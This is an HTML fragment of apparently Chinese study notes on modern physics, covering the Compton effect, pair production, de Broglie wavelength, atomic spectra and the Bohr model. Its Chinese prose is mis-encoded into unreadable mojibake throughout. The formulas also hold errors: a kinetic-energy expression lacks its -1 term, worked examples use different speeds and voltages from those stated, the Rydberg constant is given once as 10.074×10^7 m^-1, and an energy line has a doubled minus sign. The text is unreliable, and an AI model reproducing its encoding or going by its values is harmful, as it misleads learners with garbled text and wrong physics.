ä¸ºå…‰é€Ÿ. åˆ©ç”¨ç›¸å¯¹è®ºå…¬å¼å¯ä»¥è®¡ç®—å…¶è´¨é‡, èƒ½é‡å’ŒåŠ¨é‡.</p><blockquote><p>è®¡ç®—è´¨é‡</p></blockquote><p>è´¨é‡å‡è®¾ä¸º 0.</p><blockquote><p>è®¡ç®—èƒ½é‡</p></blockquote><p>è‹¥æ³¢é•¿ä¸º $\lambda$, åˆ™:</p><p>$$<br>\displaylines{E &#x3D; hf \newline~ \newline<br>\because f &#x3D; \frac{c}{\lambda} \newline~ \newline<br>\therefore E &#x3D; \frac{hc}{\lambda}}<br>$$</p><blockquote><p>è®¡ç®—åŠ¨é‡</p></blockquote><p>æ ¹æ® $E^2 &#x3D; p^2 c^2 + m^2 c^4$, è‹¥è´¨é‡ä¸ºé›¶ $m &#x3D; 0$, é‚£ä¹ˆ:</p><p>$$<br>\displaylines{p &#x3D; \frac{E}{c} \newline~ \newline<br>\because E &#x3D; hf,\ c &#x3D; \frac{\lambda}{f}  \newline~ \newline<br>\therefore p &#x3D; \frac{hf}{c} &#x3D; \frac{h}{\lambda}}<br>$$</p><blockquote><p>ä»¥ $\phi$ è§’åº¦æ•£å°„å‡ºçš„å…‰çš„æ³¢é•¿å‡è®¾ä¸º $\lambda^\prime$, å…¶èƒ½é‡å’ŒåŠ¨é‡ä¸º</p></blockquote><p>$$<br>\displaylines{E^\prime &#x3D; \frac{hc}{\lambda^\prime}\ and\ p^\prime &#x3D; \frac{h}{\lambda^\prime}}<br>$$</p><blockquote><p>è¢«ç¢°æ’çš„ç”µå­çš„åŠ¨èƒ½å’ŒåŠ¨é‡</p></blockquote><p>å‡è®¾ç”µå­åœ¨ç¢°æ’ä¹‹å‰ä¸ºé™æ­¢, æ ¹æ®ç›¸å¯¹è®ºä¸­çš„å…¬å¼å¾—å…¶åŠ¨èƒ½ä¸º:</p><p>$$<br>\displaylines{K &#x3D; \frac{mc^2}{\sqrt{1- \frac{v^2}{c^2}}} - mc^2 \newline~ \newline<br>K_e &#x3D; ( \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}) m_e c^2 }<br>$$</p><p>è¿™é‡Œçš„ $m_e$ ä¸ºç”µå­é™æ­¢æ—¶çš„è´¨é‡, $v$ æ˜¯å…¶é€Ÿåº¦.</p><p>ç”µå­çš„åŠ¨é‡ä¸º:<br>$$<br>\displaylines{ \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}m_e v}<br>$$</p><p>å¯¹ç¢°æ’è¿‡ç¨‹åº”ç”¨<mark>èƒ½é‡å®ˆæ’å®šç†</mark> (ä¸€ä¸ªå…‰å­ç¢°æ’ä¸€ä¸ªé™æ­¢ç”µå­, å¾—åˆ°èƒ½é‡å‡å°çš„å…‰å­å’Œè·å¾—åŠ¨èƒ½çš„ç”µå­):</p><p>$$<br>\displaylines{ \frac{hc}{\lambda} &#x3D; \frac{hc}{\lambda^\prime} + ( \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}) m_e c^2 }<br>$$</p><p>å°†è¿‡ç¨‹åˆ†ä¸º x è½´å’Œ y è½´åˆ†åˆ«åˆ†æ:</p><p><img src="/../img/diagram_of_Compton_Effect.png"></p><p>$$<br>\displaylines{xè½´:\ \frac{hc}{\lambda} &#x3D; \frac{hc}{\lambda^\prime} \cos \phi + \frac{m_e  v \cos \theta}{\sqrt{1 - \frac{v^2}{c^2}}} \newline~ \newline<br>yè½´:\ 0 &#x3D;  \frac{hc}{\lambda^\prime} \sin \phi -  \frac{m_e  v \sin \theta}{\sqrt{1 - \frac{v^2}{c^2}}}}<br>$$</p><p>è”ç«‹ä¸Šè¿°å…¬å¼å¯ä»¥æ¶ˆé™¤ $v$ å’Œ $\theta$:<br>$$<br>\displaylines{\lambda^\prime &#x3D; \lambda + \frac{h}{m_e c} (1 - \cos \phi) \newline~ \newline<br>(è¯æ˜è¿‡ç¨‹ç®€ç•¥) }<br>$$</p><p>æ­¤æ—¶å¯ä»¥å¾—çŸ¥, å½“ <mark> $\theta &#x3D; 0$</mark> æ—¶, æ³¢é•¿æ²¡æœ‰æ”¹å˜.</p><p>å½“æŸä¸ªè§’åº¦, è‡³ <mark> $\lambda^\prime &gt; \lambda$</mark> æ—¶:</p><p>$$<br>\displaylines{\Delta \lambda &#x3D;\lambda^\prime - \lambda &#x3D; \frac{h}{m_e c} (1 - \cos \phi)}<br>$$</p><p>è¿™ä¸ªç°è±¡å«åš <mark>Compton shift (åº·æ™®é¡¿ä½ç§»)</mark>, è€Œ $\frac{h}{m_e c}$ çš„å•ä½æ˜¯é•¿åº¦, ä¹Ÿè¢«å«åš <mark>ç”µå­çš„ Compton wavalength $\lambda_C$(ç”µå­çš„åº·æ™®é¡¿æ³¢é•¿)</mark> :</p><p>$$<br>\displaylines{\lambda_C &#x3D; \frac{h}{m_e c} &#x3D; 2.43 \times 10^{-3}nm &#x3D; 2.43pm}<br>$$</p><p> å…‰çš„æ³¢åŠ¨ç†è®ºæ²¡æœ‰é¢„æµ‹å‡º wavelength shift, è€Œè¿™é‡Œçš„åº·æ™®é¡¿æ•ˆåº”åˆ™æ˜¯å…‰çš„å…‰å­ç†è®ºçš„å®éªŒéªŒè¯.</p><h2 id="33-4-Photon-Interactions-Pair-Production"><a href="#33-4-Photon-Interactions-Pair-Production" class="headerlink" title="33-4 Photon Interactions; Pair Production"></a>33-4 Photon Interactions; Pair Production</h2><p>å½“å…‰å­ç©¿è¿‡ç‰©è´¨æ—¶, å¯èƒ½æœ‰å››ç§æƒ…å†µå‘ç”Ÿ:</p><ol><li>å’Œåº·æ™®é¡¿æ•ˆåº”é¢„æµ‹ç›¸åŒ, ç¢°æ’å, æ•£å°„å‡ºç”µå­, å…‰å­æŸå¤±èƒ½é‡, ä½†å…‰å­é€Ÿåº¦ä¸å˜, åªæ˜¯é¢‘ç‡å‡å°</li><li>å’Œå…‰ç”µæ•ˆåº”é¢„æµ‹ç›¸åŒ, ç¢°æ’å, ç”µå­è¢«æ’å‡ºåŸå­, å…‰å­æ¶ˆå¤±</li><li>å…‰å­çš„èƒ½é‡å¦‚æœä¸è¶³ä»¥å°†ç”µå­æ’å‡º, åˆ™ä½¿ç”µå­ä»ä½èƒ½çº§è·ƒè¿åˆ°é«˜èƒ½çº§, å…‰å­æ¶ˆå¤±</li><li>Pair production, å…‰å­åˆ›é€ ç‰©è´¨, äº§ç”Ÿç”µå­å’Œæ­£ç”µå­, åŒæ—¶å…‰å­æ¶ˆå¤±, å¦‚å›¾;</li></ol><p><img src="/../img/pair_production.png"></p><p>Pair production æ˜¯ä¸€ä¸ªä»çº¯å‡€èƒ½é‡äº§ç”Ÿé™æ­¢è´¨é‡çš„ä¾‹å­, ä¸”å…¶ç¬¦åˆçˆ±å› æ–¯å¦çš„è´¨èƒ½æ–¹ç¨‹ $E &#x3D; m c^2$. pair production çš„é€†è¿‡ç¨‹ä¸º, å½“ç”µå­ç¢°æ’æ­£ç”µå­, ä¸¤ä¸ªç²’å­æ¹®ç­ (åŒ…æ‹¬èƒ½é‡å’Œè´¨é‡), å½¢æˆå…‰å­çš„ç”µç£èƒ½. (æ­£å› å¦‚æ­¤, æ­£ç”µè·åœ¨è‡ªç„¶ç•Œä¸­æ— æ³•é•¿æ—¶é—´å­˜åœ¨)</p><!-- Pair production ä¸ä¼šåœ¨ç©ºç™½çš„åœ°æ–¹å‘ç”Ÿ, å› ä¸ºéš¾ä»¥ä¿è¯èƒ½é‡å’ŒåŠ¨é‡åŒæ—¶å®ˆæ’. é™¤éèƒ½é‡éƒ½ç”¨äºåˆ›é€ ç”µå­å’Œæ­£ç”µå­, è€Œæ²¡æœ‰æºå¸¦ä»»ä½•åŠ¨é‡. --><h2 id="33-5-æ³¢ç²’äºŒè±¡æ€§-äº’è¡¥æ€§åŸåˆ™-Wave-Particle-Duality-the-Principle-of-Complementarity"><a href="#33-5-æ³¢ç²’äºŒè±¡æ€§-äº’è¡¥æ€§åŸåˆ™-Wave-Particle-Duality-the-Principle-of-Complementarity" class="headerlink" title="33-5 æ³¢ç²’äºŒè±¡æ€§; äº’è¡¥æ€§åŸåˆ™ Wave-Particle Duality; the Principle of Complementarity"></a>33-5 æ³¢ç²’äºŒè±¡æ€§; äº’è¡¥æ€§åŸåˆ™ Wave-Particle Duality; the Principle of Complementarity</h2><p>å…‰ç”µæ•ˆåº”, åº·æ™®é¡¿æ•ˆåº”å’Œå…¶ä»–å®éªŒæ˜¯<mark>å…‰çš„ç²’å­ç†è®º</mark>çš„å®éªŒåŸºç¡€.</p><p>Young å’Œå…¶ä»–äººåœ¨å¹²æ¶‰å’Œè¡å°„æ–¹é¢çš„å®éªŒæ˜¯ <mark>å…‰çš„æ³¢åŠ¨ç†è®º</mark> çš„å®éªŒåŸºç¡€.</p><p>æœ€ç»ˆç»“è®ºä¸º, <mark>å…‰å…·æœ‰æ³¢ç²’äºŒè±¡æ€§</mark> .</p><p>Niels Bohr çš„äº’è¡¥æ€§åŸåˆ™. å…¶è¡¨æ˜, å¦‚æœè¦çœŸæ­£ç†è§£å…‰, éœ€è¦å°†æ³¢åŠ¨ç†è®ºå’Œå…‰å­ç†è®ºäº’è¡¥. (ä¹¦ä¸­å¹¶æ²¡æœ‰ç›´æ¥çš„å…¬å¼å®šç†ä¹‹ç±»çš„, ä¼¼ä¹æ˜¯ä¸€ä¸ªå£°æ˜)</p><p>æˆ‘ä»¬ä¸èƒ½ç›´æ¥ see directly whether light is a wave or particle.</p><h2 id="33-6-ç‰©è´¨çš„æ³¢åŠ¨æ€§-Wave-Nature-of-Matter"><a href="#33-6-ç‰©è´¨çš„æ³¢åŠ¨æ€§-Wave-Nature-of-Matter" class="headerlink" title="33.6 ç‰©è´¨çš„æ³¢åŠ¨æ€§ Wave Nature of Matter"></a>33.6 ç‰©è´¨çš„æ³¢åŠ¨æ€§ Wave Nature of Matter</h2><p>Louis de Brogile (å¾·å¸ƒç½—æ„) æ‰©å±•äº†æ³¢ç²’äºŒè±¡æ€§çš„æ¦‚å¿µ. ä»–éå¸¸æ¬£èµè‡ªç„¶ç•Œçš„å¯¹ç§°. ä»–è®¤ä¸ºå…‰ <mark>æœ‰æ—¶è¡¨ç°å¾—åƒæ³¢, æœ‰æ—¶è¡¨ç°å¾—åƒç²’å­</mark> . å› æ­¤, è‡ªç„¶ç•Œä¸­çš„ä¸€äº›ç²’å­, å¦‚ç”µå­, å¯èƒ½ä¹Ÿæœ‰æ³¢çš„æ€§è´¨.</p><p>å¾·å¸ƒç½—æ„è®¤ä¸º <mark>ç‰©è´¨ç²’å­çš„æ³¢é•¿å’ŒåŠ¨é‡æœ‰å…³</mark> , å¦‚ï¼š</p><p>$$<br>\displaylines{p &#x3D; \frac{h}{\lambda} \newline~ \newline<br>\lambda &#x3D; \frac{h}{p}}<br>$$</p><p>è¿™ä¸ªæ³¢é•¿å°±å«åšç²’å­çš„ <mark>de Broglie wavalength (å¾·å¸ƒç½—æ„æ³¢)</mark>.</p><p>æ™®é€šç‰©è´¨çš„å¾·å¸ƒç½—æ„æ³¢é•¿éå¸¸å°, éš¾ä»¥æµ‹é‡å’Œæ£€æµ‹å‡º, å¦‚:</p><blockquote><p>ä¾‹å­, ä¸€ä¸ª $0.20 kg$ çš„çƒä»¥ $15m&#x2F;s$ çš„é€Ÿåº¦æ»šåŠ¨, å…¶å¾·å¸ƒç½—æ„æ³¢ä¸º</p></blockquote><p>$$<br>\displaylines{\lambda &#x3D; \frac{h}{p} &#x3D; \frac{h}{m v} &#x3D; \frac{(6.6 \times 10^{-34} J \cdot s)}{(0.20kg)(25m&#x2F;s)} &#x3D; 2.2 \times 10^{-34}m}<br>$$</p><p>ä¸”æ³¢çš„æ€§è´¨, å¦‚å¹²æ¶‰å’Œè¡å°„éœ€è¦å½“ç‰©ä½“çš„å°ºå¯¸ä¸å†è¿œå¤§äºæ³¢é•¿æ—¶æ‰ä¼šæ˜æ˜¾æ˜¾ç°.</p><p>ä½†å°å¾®ç²’ç”±äºè´¨é‡åœ¨åˆ†æ¯, å¾€å¾€ä¼šå¾—åˆ°ç›¸å¯¹æ¯”è¾ƒå¤§çš„æ³¢é•¿, å¦‚:</p><blockquote><p>ä¾‹å­, æ±‚ç”µå­çš„æ³¢é•¿, å…¶åœ¨ç”µåŠ¿å·®ä¸º $100V$ çš„ç”µåœºä¸­è¢«åŠ é€Ÿ</p></blockquote><p>$$<br>\displaylines{\because \frac{1}{2} m v^2 &#x3D; e V \newline~ \newline<br>v &#x3D; \sqrt{ \frac{2e V}{m}} &#x3D; \sqrt{ \frac{ (2)(1.6 \times 10^{-19}C) (1000V)}{(9.1 \times 10^{-31} kg)}} &#x3D; 5.9 \times 10^6 m&#x2F;s \newline~ \newline<br>\lambda &#x3D; \frac{h}{mv} &#x3D; \frac{(6.6 \times 10^{-34}J \cdot s)}{(9.1 \times 10^{-31} kg) (5.9 \times 10^6 m&#x2F;s)} &#x3D; 1.2 \times 10^{-10}m}<br>$$</p><p>è¿™ä¸ªå¤§å°å°±å¯ä»¥è¢«ä¾¦æµ‹åˆ°.</p><p>å¿…é¡»è®¤è¯†åˆ°, æˆ‘ä»¬ä¸èƒ½ç›´æ¥çœ‹åˆ° wave-paritcle çš„å›¾åƒ, å°±åƒæ²¡æœ‰äººç›´æ¥çœ‹åˆ°ç”µå­é•¿ä»€ä¹ˆæ ·. æˆ‘ä»¬å¿…é¡»å€ŸåŠ©å®éªŒæ¥å»ºç«‹æ¨¡å‹.</p><p>æˆ‘ä»¬ä¸åº”è¯¥ç›´æ¥è®¤ä¸ºç”µå­æ˜¯ä¸€ä¸ªæ³¢æˆ–è€…ä¸€ä¸ªç²’å­, ç›¸å, æˆ‘ä»¬åº”è¯¥è®¤ä¸º, ç”µå­æ˜¯ä¸€ä¸ªæµ‹é‡çš„æ€§è´¨çš„é›†åˆ.</p><h2 id="33-7-ç”µå­æ˜¾å¾®é•œ-Electron-Microscopes"><a href="#33-7-ç”µå­æ˜¾å¾®é•œ-Electron-Microscopes" class="headerlink" title="33.7 ç”µå­æ˜¾å¾®é•œ Electron Microscopes"></a>33.7 ç”µå­æ˜¾å¾®é•œ Electron Microscopes</h2><p>ç”µå­æœ‰æ³¢çš„æ€§è´¨, ä¿ƒè¿›äº†ç”µå­æ˜¾å¾®é•œçš„å‘å±•.</p><p>å…·ä½“è§ä¹¦.</p><h2 id="33-8-æ—©æœŸçš„åŸå­æ¨¡å‹-Early-Models-of-the-Atom"><a href="#33-8-æ—©æœŸçš„åŸå­æ¨¡å‹-Early-Models-of-the-Atom" class="headerlink" title="33.8 æ—©æœŸçš„åŸå­æ¨¡å‹ Early Models of the Atom"></a>33.8 æ—©æœŸçš„åŸå­æ¨¡å‹ Early Models of the Atom</h2><blockquote><p>æœ€å¼€å§‹çš„ <mark>ç³•ç‚¹æ¨¡å‹ plums in pudding</mark></p></blockquote><p><img src="/../img/plums_in_pudding.png"></p><p>è¯¥æ¨¡å‹è¡¨ç¤º, åŸå­æ˜¯å®å¿ƒçš„å¸¦æ­£ç”µçš„çƒä½“, å¸¦è´Ÿç”µçš„ç”µå­é•¶åµŒåœ¨å…¶ä¸­.</p><blockquote><p>Rutherfordâ€™s planetary model, å¢ç‘Ÿç¦çš„æ¨¡å‹</p></blockquote><p><img src="/../img/Rutherford_model_of_the_atom.png"></p><p>å¸¦è´Ÿç”µçš„ç”µå­å›´ç»•ä¸€ä¸ªå¸¦æ­£ç”µçš„æå°çš„åŸå­æ ¸, åŸå­ä¸­çš„å¤§éƒ¨åˆ†ä¸ºç©ºçš„ç©ºé—´. å¢ç‘Ÿç¦çš„å®éªŒé¢„æµ‹, åŸå­æ ¸çš„åŠå¾„ä¸º $10^{-15} \sim 10^{-14}m$, è€Œä»çˆ±å› æ–¯å¦çš„åˆ†æ, åŸå­çš„åŠå¾„ä¸ºå¤§çº¦ $10^{-10}m$. </p><p>è¿™ä¸ªæ¨¡å‹æ˜¯ä»<mark>$\alpha$ ç²’å­æ•£å°„å®éªŒ</mark> ä¸­é¢„æµ‹å‡ºçš„.</p><p><img src="/../img/alpha_particle_scattering_exp.png"></p><p>å®éªŒç°è±¡ä¸º, å¤§éƒ¨åˆ† $\alpha$ ç²’å­ç›´æ¥ç©¿è¿‡, å°éƒ¨åˆ†ä»¥å¤§è§’åº¦å˜åŒ–åå¼¹.</p><h2 id="33-9-åŸå­å…‰è°±-åŸå­ç»“æ„çš„å…³é”®-Atomic-Spectra-Key-to-the-Structure-of-the-Atom"><a href="#33-9-åŸå­å…‰è°±-åŸå­ç»“æ„çš„å…³é”®-Atomic-Spectra-Key-to-the-Structure-of-the-Atom" class="headerlink" title="33.9 åŸå­å…‰è°±: åŸå­ç»“æ„çš„å…³é”® Atomic Spectra: Key to the Structure of the Atom"></a>33.9 åŸå­å…‰è°±: åŸå­ç»“æ„çš„å…³é”® Atomic Spectra: Key to the Structure of the Atom</h2><p>çƒ­çš„ç‰©ä½“å‘å‡ºè¾å°„, åŸå› è®¤ä¸ºæ˜¯åŸå­å’Œåˆ†å­çš„æŒ¯åŠ¨.</p><p>è®©ç¨€æœ‰æ°”ä½“æ¿€å‘å¹¶å‘å‡ºå…‰çº¿çš„æ–¹æ³•æœ‰:</p><ul><li>åŠ é«˜çƒ­</li><li>æ”¾åœ¨ä½å‹çš„ç®¡å­ä¸­, å¹¶åŠ ä¸Šé«˜å‹</li></ul><p>è¿™äº›è¾å°„çš„å…‰è°±æ˜¯ä¸è¿ç»­çš„, å› ä¸ºæ¿€å‘çš„æ°”ä½“åªä¼šè¾å°„å‡ ç§æ³¢é•¿.</p><p>å½“ç”¨å…‰è°±ä»ª, åˆ†å…‰é•œåˆ†æè¿™äº›å…‰æ—¶, ä¹Ÿå‘ç°äº†çº¿è°± (line spectrum) è€Œä¸æ˜¯è¿ç»­çš„å…‰è°±. å¦‚:</p><p><img src="/../img/emission_spectra.png"></p><p>(è¿™é‡Œçš„ç™½çº¿é»‘çº¿åº”è¯¥å°±æ˜¯çº¿è°±)</p><p>å‘å°„å…‰è°± (emission spectrum) æ˜¯ææ–™çš„ç‰¹æ€§, èƒ½å¤Ÿç”¨äºåŒºåˆ†æ°”ä½“.</p><p><mark>å¸æ”¶å…‰è°±çš„å®šä¹‰</mark>: è¿ç»­å…‰è°±ç©¿è¿‡ç¨€æœ‰æ°”ä½“ï¼Œäº§ç”Ÿçš„å…‰è°±ä¸­ä¼šæœ‰é»‘çº¿ï¼Œæ³¢é•¿ä¸ç¨€æœ‰æ°”ä½“é‡Šæ”¾çš„ç›¸åŒ (äº§ç”Ÿé»‘çº¿çš„åŸå› å°±æ˜¯è¢«å¸æ”¶äº†)</p><p>å¤§éƒ¨åˆ†åŸå­çš„å…‰è°±å›¾æ²¡æœ‰æ˜æ˜¾çš„è§„å¾‹æ€§, è€Œæ°¢åŸå­çš„å…‰è°±å›¾æœ‰, å…¶ä»ç¬¬ä¸‰æ¡å¼€å§‹æ»¡è¶³å…¬å¼:</p><p>$$<br>\displaylines{ \frac{1}{\lambda} &#x3D; R ( \frac{1}{2^2} - \frac{1}{n^2}),\ n&#x3D;3,4,â€¦}<br>$$<br>( $R$ ä¸º Rydberg constant é›·å¾·åšæ ¼å¸¸é‡, å€¼ä¸º $10.074 \times 10^7 m^{-1}$)</p><p>è¿™é‡Œ, $n$ ä» 3 å¼€å§‹, è¿™ä¸ªå…¬å¼è¢«ç§°ä¸º <mark>Balmer series (å·´å°”é»˜å…¬å¼)</mark>. å½“ $\lambda &#x3D; 365nm$ æ—¶, è®¤ä¸º $n &#x3D; \infty$.</p><p><img src="/../img/Balmer_series_of_lines_for_hydrogen.png"></p><blockquote><p>Lyman series</p></blockquote><p>$$<br>\displaylines{ \frac{1}{\lambda} &#x3D; R ( \frac{1}{1^2} - \frac{1}{n^2}),\ n&#x3D;2,3â€¦ \newline~ \newline<br>91nm \le \lambda \le 122nm}<br>$$</p><blockquote><p>Paschen series</p></blockquote><p>$$<br>\displaylines{ \frac{1}{\lambda} &#x3D; R ( \frac{1}{3^2} - \frac{1}{n^2}),\ n&#x3D;4,5â€¦ \newline~ \newline<br>820nm \le \lambda \le 1875nm}<br>$$</p><p>å¢ç‘Ÿç¦çš„æ¨¡å‹ä¸èƒ½è§£é‡Šä¸ºä»€ä¹ˆç²’å­ä¼šé‡Šæ”¾ line spectra. ä¸¤ä¸ªéš¾é¢˜:</p><ol><li>å…¶é¢„æµ‹ç²’å­ä¼šé‡Šæ”¾è¿ç»­é¢‘ç‡çš„æ³¢, è€Œå®éªŒä¸º line spectra å³ä¸è¿ç»­</li><li>å…¶é¢„æµ‹åŸå­æ˜¯ä¸ç¨³å®šçš„, ä½†å®é™…ä¸Šæ˜¯ç¨³å®šçš„</li></ol><h2 id="33-10-æ³¢å°”æ¨¡å‹-The-Bohr-Model"><a href="#33-10-æ³¢å°”æ¨¡å‹-The-Bohr-Model" class="headerlink" title="33.10 æ³¢å°”æ¨¡å‹ The Bohr Model"></a>33.10 æ³¢å°”æ¨¡å‹ The Bohr Model</h2><p>ä» Planck å’Œ Einstein çš„å®éªŒ, èƒ½é‡çš„æ”¹å˜æ˜¯ä¸è¿ç»­çš„. Bohr è¡¨æ˜, ä¸€ä¸ªåŸå­ä¸­çš„ç”µå­ä¸èƒ½è¿ç»­çš„å¤±å»èƒ½é‡, but do so in quantum â€œjumpsâ€. (å’Œé‡å­åªèƒ½æ˜¯ $hf$ çš„å€æ•°ä¸€ä¸ªé“ç†)</p><p>Bohr å‡è®¾, ç”µå­åœ¨åŸå­æ ¸å‘¨å›´çš„è½¨é“ä¸Šè¿åŠ¨, ç”µå­åœ¨æ¯ä¸€ä¸ªè½¨é“ä¸Šä¼šæœ‰ç¡®åˆ‡çš„èƒ½é‡, ä¸”åœ¨åŒä¸€ä¸ªè½¨é“ä¸Šè¿åŠ¨ä¸ä¼šé‡Šæ”¾èƒ½é‡. è¿™äº›è½¨é“è¢«ç§°ä¸º <mark>é™æ­¢çŠ¶æ€ stationary states</mark>, å‘å°„å…‰çº¿æ—¶, ç”µå­ä¼šä» stationary state è·³åˆ°ä½èƒ½é‡çš„ stationary state. (ä¹Ÿå°±æ˜¯é«˜èƒ½çº§åˆ°ä½èƒ½çº§) æ¯ä¸€è·³ä¼šé‡Šæ”¾ä¸€ä¸ªå…‰å­çš„èƒ½é‡, å³:</p><p>$$<br>\displaylines{hf &#x3D; E_u - E_l \newline~ \newline<br>(u æŒ‡ upper, l æŒ‡ lower)}<br>$$</p><p><img src="/../img/atom_jump_and_emit_a_photon.png"></p><blockquote><p>Bohrâ€™s quantum condition</p></blockquote><p>$$<br>\displaylines{L &#x3D; m v r_n &#x3D; n \frac{h}{2 \pi},\ n&#x3D;1,2,3â€¦}<br>$$<br>è¿™é‡Œ, $L$ æŒ‡è§’åŠ¨é‡, $r_n$ æŒ‡ç¬¬ n ä¸ªè½¨é“çš„åŠå¾„, $v$ æŒ‡é€Ÿåº¦. è¿™ä¸ª n åŒæ—¶è¢«ç§°ä¸ºè½¨é“çš„<mark>é‡å­æ•° (quantum number)</mark> </p><blockquote><p>æ¨å¯¼è½¨é“åŠå¾„</p></blockquote><p>ç¤ºæ„å›¾ä¸º:</p><p><img src="/../img/electron_in_orbit_around_the_nucleus.png"></p><p>ç”µå­åœ¨åŠå¾„ä¸º $r_n$ çš„è½¨é“ä¸Šè¿åŠ¨æ—¶ä¼šæœ‰è§’åŠ é€Ÿåº¦ $\frac{v^2}{r_n}$ (ç”±åŸå­å’Œæ­£ç”µè·å’Œç”µå­äº§ç”Ÿçš„ä½œç”¨åŠ›å¼•èµ·)</p><p>$$<br>\displaylines{ç»“åˆåº“ä»‘å®šç† \newline~ \newline<br>ç”µå­å—åˆ°çš„åŠ›: F &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{(Ze)(e)}{r^2} \newline~ \newline<br>(Z æ˜¯æ­£ç”µè·æ•°é‡) \newline~ \newline<br>ç”±ç‰›é¡¿ç¬¬äºŒå®šå¾‹: \newline~ \newline<br>F &#x3D; ma \newline~ \newline<br>ä»¥åŠ: \newline~ \newline<br>a &#x3D; \frac{v^2}{r_n} \newline~ \newline<br>å¾—: \frac{1}{4 \pi \epsilon_0} \frac{Z e^2}{r_n^2} &#x3D; \frac{m v^2}{r_n} \newline~ \newline<br>è§£å‡º r_n ä¸º: \newline~ \newline<br>r_n &#x3D; \frac{Ze^2}{4 \pi \epsilon_0 m v^2} \newline~ \newline<br>\because v &#x3D; \frac{nh}{2 \pi m r_n} (ä¸Šé¢çš„ Bohrâ€™s quantum condition) \newline~ \newline<br>\therefore r_n &#x3D; \frac{Ze^2 4 \pi^2 m r_n^2}{4 \pi \epsilon_0 n^2 h^2} \newline~ \newline<br>æŠµæ¶ˆä¸¤è¾¹çš„ r_n å¹¶åŒ–ç®€: \newline~ \newline<br>r_n &#x3D; \frac{n^2 h^2 \epsilon_0}{\pi m Z e^2} &#x3D; \frac{n^2}{Z} r_1 \newline~ \newline<br>r_1 &#x3D; \frac{h^2 \epsilon_0}{\pi m e^2} \newline~ \newline<br>(r_1 æŒ‡ n &#x3D; 1, Z &#x3D; 1 æ—¶çš„å€¼)<br>}<br>$$</p><p>æ°¢åŸå­è½¨é“çš„æœ€å°è½¨é“çš„åŠå¾„ $r_1 &#x3D; 0.529 \times 10^{-10}$ è¢«ç§°ä¸º <mark>Bohr radius</mark>.</p><blockquote><p>è½¨é“ä¸Šçš„èƒ½é‡è®¡ç®—</p></blockquote><p>æ€»èƒ½é‡ä¸ºåŠ¨èƒ½åŠ ä¸ŠåŠ¿èƒ½.</p><p>$$<br>\displaylines{V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q}{r} &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Ze}{r} \newline~ \newline<br>U &#x3D; -eV &#x3D; - \frac{1}{4 \pi \epsilon_0} \frac{Ze^2}{r}}<br>$$</p><p>ç¬¬ n ä¸ªè½¨é“ä¸Šçš„èƒ½é‡ä¸º:<br>$$<br>\displaylines{E_n &#x3D; \frac{1}{2}m v^2 - - \frac{1}{4 \pi \epsilon_0} \frac{Ze^2}{r}}<br>$$</p><p>å¸¦å…¥:<br>$$<br>\displaylines{v &#x3D; \frac{nh}{2 \pi m r_n} \newline~ \newline<br>r_n &#x3D; \frac{n^2 h^2 \epsilon_0}{\pi m Z e^2}}<br>$$</p><p>å¾—:<br>$$<br>\displaylines{E_n &#x3D; -( \frac{Z^2 e^4 m}{8 \epsilon_0^2 h^2}) ( \frac{1}{n^2})\ n&#x3D;1,2,3â€¦ \newline~ \newline<br>E_n &#x3D; \frac{Z^2}{n^2}E_1\ n&#x3D;1,2,3â€¦ \newline~ \newline<br>(E_1 ä¸º n&#x3D;1, Z&#x3D;1 æ—¶) \newline~ \newline<br>E_1 &#x3D; - \frac{m e^4}{8 \epsilon_0^2 h^2} &#x3D; -2.17 \times 10^{-18}J &#x3D; -13.6eV}<br>$$</p><p>æœ€ä½çš„èƒ½çº§ (energy level or energy state) çš„èƒ½é‡ä¸º E_1, è¢«ç§°ä½œ <mark>åŸºæ€ (ground state)</mark> . å…¶ä½™é«˜èƒ½çº§éƒ½è¢«ç§°ä½œ <mark>æ¿€å‘æ€ (excited states)</mark><br>(å†…å±‚æ˜¯ä½èƒ½çº§, å¤–å±‚æ˜¯é«˜èƒ½çº§, æ¯”è¾ƒæ¿€å‘æ˜¯å¾€å¤–æ¿€å‘, æ¿€å‘åˆ°æœ€åæ˜¯è„±ç¦»)</p><p><mark>æ³¨æ„æ‰€æœ‰çš„èƒ½çº§çš„èƒ½é‡éƒ½æ˜¯ä½äº 0</mark>. (è¿™æ ·ç†è§£, ä¸€ä¸ªç”µå­ä»å¤–ç•Œåˆ°åŸå­æ ¸æ‰€éœ€è¦çš„èƒ½é‡, è¶Šåˆ°å†…éƒ¨, å³è¶Šåˆ°ä½èƒ½çº§æ‰€éœ€è¦çš„èƒ½é‡è¶Šå¤š, è´Ÿå¾—ä¹Ÿå°±è¶Šå¤š, åŸå­å¤–å°±ç›¸å½“äº 0)</p><p>å°†ç”µå­ä»åŸºæ€åˆ°ç¦»å¼€åŸå­æ‰€éœ€è¦çš„èƒ½é‡ç§°ä¸º <mark>ç»“åˆèƒ½æˆ–ç”µç¦»èƒ½ (binding energy or ionization energy)</mark>.</p><p>æ°¢åŸå­çš„ç”µç¦»èƒ½å¤§æ¦‚ä¸º $13.6eV$.</p><p>å¤„äºä¸åŒèƒ½çº§çš„ç”µå­å…·æœ‰ä¸åŒçš„é¢‘ç‡?</p><p>$$<br>\displaylines{f &#x3D; \frac{c}{\lambda} \newline~ \newline<br>hf &#x3D; h \frac{c}{\lambda} \newline~ \newline<br>\because hf &#x3D; E_n - E_{n^\prime} \newline~ \newline<br>(hf &#x3D; E_u - E_l è¿™ä¸ªå…¬å¼) \newline~ \newline<br>\therefore \frac{1}{\lambda} &#x3D; \frac{1}{hc} (E_n - E_{n^\prime}) \newline~ \newline<br>\because E_n &#x3D; -( \frac{Z^2 e^4 m}{8 \epsilon_0^2 h^2}) ( \frac{1}{n^2})\ n&#x3D;1,2,3â€¦ \newline~ \newline<br>\therefore \frac{1}{\lambda} &#x3D; \frac{Z^2 e^4 m}{8 \epsilon_0^2 h^3 c}( \frac{1}{(n^\prime)^2} - \frac{1}{(n)^2})<br>}<br>$$</p><p>è¿™ä¸ªå…¬å¼å’Œ Balmer formula æœ‰ç›¸åŒçš„å½¢å¼.</p><p>å½“ $Z&#x3D;1$ æ—¶, $\frac{Z^2 e^4 m}{8 \epsilon_0^2 h^3 c}$ çš„å€¼å’Œ Rydberg constant å€¼ç›¸åŒ, $R &#x3D; 1.0974 \times 10^7 